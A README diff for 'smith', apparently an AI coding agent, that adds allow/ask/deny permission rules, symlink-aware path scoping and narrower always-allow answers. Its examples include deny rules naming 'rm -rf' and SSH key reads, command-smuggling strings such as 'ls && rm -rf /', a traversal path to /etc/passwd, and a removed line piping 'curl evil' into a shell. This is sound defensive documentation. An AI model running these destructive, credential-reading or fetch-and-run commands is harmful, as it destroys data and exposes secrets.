@@ -17,6 +17,7 @@ It is inspired by and built according to the policy-free agent loop principles o
 - **📂 Project Context & Skills Catalog**:
   - Automatically loads instructions from `SMITH.md` or `AGENTS.md`, walking up from the current directory to the Git root, plus global instructions from `~/.smith/`.
   - Discovers reusable skills in `.smith/skills/<name>/SKILL.md` (project-local), `~/.smith/skills/` (global), as well as `.gemini/skills/` and `.agents/skills/`, and expands `$skill-name` or `/skill-name` references at runtime. The home directory can be overridden via the `SMITH_HOME` environment variable.
+- **🔐 Permission Rules (`Smith::Tools::RuleSet`)**: `allow` / `ask` / `deny` rules with path scoping and wildcards. Deny wins over everything, including `--yes`, and reaches read-only tools too.
 - **💰 Prompt Caching (Anthropic)**: The system prompt, the tool definitions and a rolling transcript prefix carry cache breakpoints, so a long session stops paying full price for the same prefix on every turn.
 - **🪝 Hooks (`Smith::Hooks`)**: Five extension points — `session_start`, `user_prompt_submit`, `pre_tool_use`, `post_tool_use`, `stop` — that run configured shell commands and can inject context, rewrite tool arguments, block a call, or keep the loop going until the tests pass.
 - **🧭 Plan Mode (`Smith::PlanSession`)**: Research first, change nothing, then present a plan for approval. Every mutating tool is hard-blocked until you say yes — including through subagents.
@@ -120,8 +121,10 @@ connect_timeout = 10             # seconds
 read_timeout    = 120
 
 [approval]
-mode      = "prompt"             # prompt | auto
-allowlist = ["ls", "git status"]
+mode  = "prompt"                 # prompt | auto
+allow = ["bash(git *)", "write_file(src/**)"]
+ask   = ["bash(git push *)"]
+deny  = ["bash(rm -rf *)", "read_file(**/.ssh/**)"]
 
 [context]
 max_tokens = 120000
@@ -137,7 +140,7 @@ Relevant environment variables: `SMITH_PROVIDER`, `SMITH_MODEL`, `SMITH_MODE`, `
 
 `[http]` applies to all four providers. An elapsed `read_timeout` is **not** retried, so it is genuinely the longest smith will wait on a single call — connection errors and 429/5xx responses still go through the exponential-backoff retry handler.
 
-`[subagents]` bounds delegation — see [Subagent Limits](#subagent-limits). `[providers.<name>] cache` toggles prompt caching — see [Prompt Caching](#prompt-caching). `[hooks]` defines the extension points — see [Hooks](#hooks), and read the trust section before using them. `[approval]` gates the mutating tools — see [Approval Mode](#approval-mode) below. `[context]` caps how large the transcript may grow — see [Context Compaction](#context-compaction). `[defaults] stream` toggles streaming — see [Streaming](#streaming). `[defaults] mode` starts smith in plan mode — see [Plan Mode](#plan-mode).
+`[subagents]` bounds delegation — see [Subagent Limits](#subagent-limits). `[providers.<name>] cache` toggles prompt caching — see [Prompt Caching](#prompt-caching). `[approval] allow`/`ask`/`deny` are the permission rules — see [Permission Rules](#permission-rules). `[hooks]` defines the extension points — see [Hooks](#hooks), and read the trust section before using them. `[approval]` gates the mutating tools — see [Approval Mode](#approval-mode) below. `[context]` caps how large the transcript may grow — see [Context Compaction](#context-compaction). `[defaults] stream` toggles streaming — see [Streaming](#streaming). `[defaults] mode` starts smith in plan mode — see [Plan Mode](#plan-mode).
 
 ### Streaming
 
@@ -223,13 +226,79 @@ Ways to skip the prompt:
 |---|---|
 | `--yes` / `--auto-approve` | Runs everything, for this invocation |
 | `mode = "auto"` in `[approval]` | Runs everything, persistently |
-| `allowlist` in `[approval]` | Runs matching `bash` commands without asking |
-
-An allowlist entry matches a command exactly or as a whole first word (`git status` allows `git status --short`, never `git statuses`). Commands are split on shell metacharacters (`;`, `&&`, `|`, `` ` ``, `$(`, redirects) and **every** segment must match on its own, so `ls && curl evil | sh` still prompts. The splitter is deliberately not a shell parser — quoted metacharacters split too, which means it errs towards asking too often rather than allowing too much.
+| `allow` rules in `[approval]` | Runs matching calls without asking |
 
 Without an interactive terminal there is nobody to ask, so `prompt` mode refuses mutating tools rather than running them. Pass `--yes` for headless runs.
 
-Subagents inherit the parent's approver, so a delegated `bash` call is asked for just like a direct one.
+Subagents inherit the parent's approver, so a delegated `bash` call is asked for just like a direct one — and so are the rules below.
+
+### Permission Rules
+
+The blunt version of the above leaves only two states: answer prompts forever, or `--yes` and hope. Rules give you the middle.
+
+```toml
+[approval]
+mode = "prompt"
+
+allow = [
+  "read_file(**)",
+  "bash(git *)",
+  "bash(npm run *)",
+  "write_file(src/**)",
+]
+
+ask  = ["bash(git push *)"]       # ask anyway, despite bash(git *)
+
+deny = [
+  "bash(rm -rf *)",
+  "write_file(.env*)",
+  "read_file(**/.ssh/**)",
+]
+```
+
+Every rule is `tool(pattern)`. Precedence is **`deny` > `ask` > `allow` > `mode`**.
+
+**Deny always wins.** Not overridable by `--yes`, not by `mode = "auto"`, not by answering `[a]lways`. That is the point: you can allow `bash(*)` and still keep `bash(rm -rf *)` shut. A refusal tells the model which rule stopped it, so it looks for another route instead of retrying:
+
+```text
+Tool 'write_file' is blocked by the deny rule `write_file(.env*)`.
+This cannot be overridden at runtime; the rule lives in the [approval] config.
+```
+
+**Deny reaches read-only tools too.** `read_file`, `grep` and `glob` normally skip the gate entirely; a deny or ask rule naming one of them pulls it back in. That is what makes `read_file(**/.ssh/**)` mean anything. Tools no rule mentions stay on the fast path.
+
+#### Patterns
+
+For `bash` the pattern matches the command. `*` matches anything within a segment, at any position:
+
+| Rule | Matches |
+|---|---|
+| `bash(git status)` | `git status`, `git status --short` — not `git statuses` |
+| `bash(git *)` | `git push origin main` |
+| `bash(* install)` | `npm install`, `bundle install --path vendor` |
+
+Commands are still split on shell metacharacters (`;`, `&&`, `|`, `` ` ``, `$(`, redirects), and the two directions treat the pieces differently — deliberately:
+
+- **allow** requires **every** segment to match, so an allowed prefix cannot smuggle a second command in behind it. `bash(git *)` does not allow `git status; rm -rf /`.
+- **deny** needs **any** segment to match, so a denied command cannot hide behind a harmless one. `bash(rm -rf *)` still catches `ls && rm -rf /`.
+
+The splitter is not a shell parser — quoted metacharacters split too — so it errs towards asking too often rather than allowing too much.
+
+For the file tools the pattern is a glob on the path. Paths are resolved to absolute form and **symlinks are followed** before matching, so neither `write_file(src/../../../etc/passwd)` nor a symlink planted inside `src/` escapes a `write_file(src/**)` scope. A pattern starting with `**` stays unanchored — that is how `read_file(**/.ssh/**)` catches a key outside the project — while any other relative pattern is anchored to the project directory.
+
+#### The always-allow answer
+
+`[a]lways` used to mean "this tool, everywhere, for the rest of the session": one confirmed `write_file` and every path was open. It now offers the narrowest rule that covers the call:
+
+```text
+   Allow? [y]es / [n]o / [a]lways allow `bash(npm run *)`:
+```
+
+Only that rule is remembered, and a deny rule still outranks it.
+
+#### The old allowlist
+
+`allowlist = [...]` keeps working, mapped to `allow = ["bash(<entry>)"]`, with a deprecation notice on stderr.
 
 ### Subagent Limits
 
@@ -544,7 +613,8 @@ src/
     └── tools/
         ├── tool.cr          # Abstract Tool base class & ParallelTool/MutatingTool markers
         ├── registry.cr      # Tool registry, approval gate & Fiber parallel execution scheduler
-        ├── approval.cr      # Approver strategies (prompt/auto/deny/plan) & bash allowlist matching
+        ├── approval.cr      # Approver strategies (prompt/auto/deny/plan/rule) & bash allowlist matching
+        ├── permissions.cr   # allow/ask/deny rules, path normalisation & pattern matching
         ├── bash.cr          # Shell command execution tool
         ├── read_file.cr     # File reading tool
         ├── write_file.cr    # File writing tool
